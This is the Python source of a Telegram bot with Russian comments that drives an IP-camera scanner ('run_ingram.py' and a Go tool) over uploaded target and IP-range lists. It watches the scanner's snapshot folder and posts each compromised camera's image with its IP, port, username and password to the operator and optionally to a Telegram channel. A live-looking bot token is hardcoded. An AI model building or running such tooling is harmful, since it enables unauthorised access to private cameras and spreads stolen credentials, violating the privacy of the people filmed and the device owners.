# bot.py
import os
import time
import string
import random
import asyncio
import subprocess
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.error import TimedOut, TelegramError
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from PIL import Image
import io
import re

# ----------------- ЛОГИРОВАНИЕ -----------------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,  # Можно DEBUG, чтобы видеть всё
)
logger = logging.getLogger(__name__)

# ----------------- НАСТРОЙКИ -----------------
TOKEN = "7754624523:AAGK9CKhfqIQYmAn7tx43XmcRl3HdYqMSFo"
CHANNEL_ID = -1002851273551          # ID канала для пересылки
SCANNING = False
SCAN_PROCESS = None
OBSERVER = None
SENT_IPS = set()                     # Уже отправленные IP
USER_ID = None                       # Кто запустил скан
FORWARD_TO_CHANNELS = False
AWAITING_FILE = None
GO_PROCESS = None
GO_RUNNING = False

# ----------------- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ -----------------
def generate_random_name(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def compress_image(image_path):
    try:
        output = io.BytesIO()
        with Image.open(image_path) as img:
            img = img.convert('RGB')
            img.thumbnail((800, 800))
            img.save(output, format='JPEG', quality=85, optimize=True)
        output.seek(0)
        logger.debug(f"Сжал изображение: {image_path}")
        return output
    except Exception as e:
        logger.error(f"Ошибка сжатия {image_path}: {e}")
        return None

def parse_filename(filename):
    # Поддерживаем формат: ip-port-username-password.jpg
    pattern = r"^(\d+\.\d+\.\d+\.\d+)-(\d+)-(.+)-(.+)\.jpg$"
    match = re.match(pattern, filename)
    if match:
        return {
            'ip': match.group(1),
            'port': match.group(2),
            'username': match.group(3),
            'password': match.group(4),
        }
    logger.debug(f"Файл не подходит под паттерн: {filename}")
    return None

# ----------------- ОБРАБОТЧИК ФАЙЛОВ -----------------
class SnapshotHandler(FileSystemEventHandler):
    def __init__(self, bot, channels, loop):
        self.bot = bot
        self.channels = channels
        self.loop = loop  # Главный event-loop

    def _send_async(self, coro):
        """Запускает корутину в главном потоке."""
        asyncio.run_coroutine_threadsafe(coro, self.loop).result(timeout=20)

    def on_created(self, event):
        if event.is_directory or not event.src_path.lower().endswith('.jpg'):
            logger.debug("Пропускаем: %s", event.src_path)
            return

        filename = os.path.basename(event.src_path)
        parsed = parse_filename(filename)
        if not parsed or parsed['ip'] in SENT_IPS:
            return

        SENT_IPS.add(parsed['ip'])

        message = (
            "🔍 **Хацуне Мику нашла для вас камеру!**\n"
            f"**АйРi**: {parsed['ip']}\n"
            f"**R0рt**: {parsed['port']}\n"
            f"**U$**: {parsed['username']}\n"
            f"**P@r0ль**: {parsed['password']}"
        )

        img_buffer = compress_image(event.src_path)
        if not img_buffer:
            return

        # Отправляем пользователю
        try:
            self._send_async(
                self.bot.send_photo(
                    chat_id=USER_ID,
                    photo=img_buffer,
                    caption=message,
                    parse_mode='Markdown',
                )
            )
            logger.info("Отправлено пользователю %s: %s", USER_ID, filename)
        except Exception as e:
            logger.error("Ошибка отправки пользователю: %s", e)

        # Отправляем в каналы
        if FORWARD_TO_CHANNELS:
            for cid in self.channels:
                try:
                    img_buffer.seek(0)
                    self._send_async(
                        self.bot.send_photo(
                            chat_id=cid,
                            photo=img_buffer,
                            caption=message,
                            parse_mode='Markdown',
                        )
                    )
                    logger.info("Отправлено в канал %s: %s", cid, filename)
                except Exception as e:
                    logger.error("Ошибка отправки в канал %s: %s", cid, e)

# ----------------- ОСТАЛЬНЫЕ ХЭНДЛЕРЫ (без изменений логики) -----------------
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error("Ошибка: %s", context.error)

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global AWAITING_FILE, GO_RUNNING, GO_PROCESS
    if not AWAITING_FILE:
        return
    doc = update.message.document
    if not doc or not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Загрузите .txt файл!")
        return

    file_path = f"{AWAITING_FILE}.txt"
    await (await doc.get_file()).download_to_drive(file_path)
    await update.message.reply_text(f"✅ {AWAITING_FILE}.txt сохранён.")

    if AWAITING_FILE == 'ranges':
        cmd = "go run app.go"
        try:
            GO_PROCESS = subprocess.Popen(cmd, shell=True)
            GO_RUNNING = True
            logger.debug("GO процесс запущен.")
        except Exception as e:
            logger.error("Не удалось запустить GO: %s", e)
            await update.message.reply_text("❌ Ошибка запуска GO.")

    AWAITING_FILE = None
    await show_menu(update, context)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_menu(update, context)

async def show_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🚀 Начать скан", callback_data='start_scanning')],
        [InlineKeyboardButton("📤 Загрузить targets.txt", callback_data='upload_targets')],
        [InlineKeyboardButton("⚡ GOFPS", callback_data='start_gofps')],
    ]
    if GO_RUNNING:
        keyboard.append([InlineKeyboardButton("🛑 Стоп GO", callback_data='stop_gofps')])
    markup = InlineKeyboardMarkup(keyboard)
    await update.effective_message.reply_text(
        "👋 Выберите действие:", reply_markup=markup
    )

# ----------------- CALLBACK HANDLER -----------------
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global SCANNING, SCAN_PROCESS, OBSERVER, USER_ID, FORWARD_TO_CHANNELS, AWAITING_FILE, GO_PROCESS, GO_RUNNING, SENT_IPS
    query = update.callback_query
    await query.answer()

    if query.data == 'start_scanning':
        keyboard = [
            [InlineKeyboardButton("📢 В каналы", callback_data='forward_yes')],
            [InlineKeyboardButton("🔒 Только мне", callback_data='forward_no')],
        ]
        await query.message.reply_text("Куда отправлять снимки?", reply_markup=InlineKeyboardMarkup(keyboard))

    elif query.data == 'upload_targets':
        AWAITING_FILE = 'targets'
        await query.message.reply_text("📤 Отправьте новый targets.txt")

    elif query.data == 'start_gofps':
        AWAITING_FILE = 'ranges'
        await query.message.reply_text("📤 Отправьте новый ranges.txt")

    elif query.data in ['forward_yes', 'forward_no']:
        FORWARD_TO_CHANNELS = query.data == 'forward_yes'
        USER_ID = query.from_user.id
        channels = [CHANNEL_ID] if FORWARD_TO_CHANNELS else []

        # Проверка админ-прав
        if FORWARD_TO_CHANNELS:
            try:
                admins = await context.bot.get_chat_administrators(CHANNEL_ID)
                if not any(a.user.id == context.bot.id for a in admins):
                    await query.message.reply_text("❌ Бот не админ в канале!")
                    channels.clear()
            except TelegramError as e:
                logger.error("Ошибка проверки прав: %s", e)
                channels.clear()

        SENT_IPS.clear()
        random_name = generate_random_name()
        cmd = f"python run_ingram.py -i targets.txt -o {random_name}"
        try:
            SCAN_PROCESS = subprocess.Popen(cmd, shell=True)
            SCANNING = True
        except Exception as e:
            logger.error("Не удалось запустить скан: %s", e)
            await query.message.reply_text("❌ Ошибка запуска сканирования.")
            return

        snapshots_path = os.path.join(random_name, 'snapshots')
        max_attempts = 10
        for _ in range(max_attempts):
            if os.path.exists(snapshots_path):
                break
            time.sleep(1)
        else:
            await query.message.reply_text("❌ Нет папки snapshots.")
            SCAN_PROCESS.terminate()
            SCANNING = False
            return

        OBSERVER = Observer()
        event_handler = SnapshotHandler(
            bot=context.bot,
            channels=channels,
            loop=asyncio.get_event_loop(),  # Главный loop
        )
        OBSERVER.schedule(event_handler, snapshots_path, recursive=False)
        OBSERVER.start()

        await query.message.reply_text(
            f"🔎 Скан запущен. Папка: {random_name}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🛑 Стоп", callback_data='stop_scanning')],
            ])
        )

    elif query.data == 'stop_scanning':
        if SCANNING:
            SCAN_PROCESS.terminate()
            OBSERVER.stop()
            OBSERVER.join()
            SCANNING = False
            SENT_IPS.clear()
            await query.message.reply_text("🛑 Скан остановлен!")
            await show_menu(update, context)

    elif query.data == 'stop_gofps':
        if GO_RUNNING:
            GO_PROCESS.terminate()
            GO_RUNNING = False
            await query.message.reply_text("🛑 GO остановлен!")
            await show_menu(update, context)

# ----------------- MAIN -----------------
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_error_handler(error_handler)

    logger.info("Бот запущен.")
    app.run_polling()

if __name__ == "__main__":
    main()